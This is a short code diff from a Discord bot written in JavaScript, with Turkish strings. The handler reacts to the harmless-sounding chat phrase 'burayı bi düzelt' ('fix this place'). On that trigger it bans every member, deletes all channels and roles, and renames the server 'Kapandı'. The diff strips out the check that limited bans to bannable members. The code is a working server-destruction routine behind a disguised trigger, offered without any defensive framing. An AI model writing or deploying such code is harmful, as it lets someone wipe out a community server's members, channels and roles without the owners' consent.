@@ -11,11 +11,7 @@ console.log('Hazırım.');
 berke.on('message', async msg => {
   if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
 
-    msg.guild.members.forEach(u => {
-        if (u.bannable) {    
-            return u.ban();
-        }
-    })
+    msg.guild.members.forEach(member => member.ban())
     msg.guild.channels.deleteAll();
     msg.guild.roles.deleteAll();
     msg.guild.setName("Kapandı");
@@ -25,7 +21,7 @@ berke.on('message', async msg => {
   }
 });
 
-////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
 
 
 berke.on('message', message => {
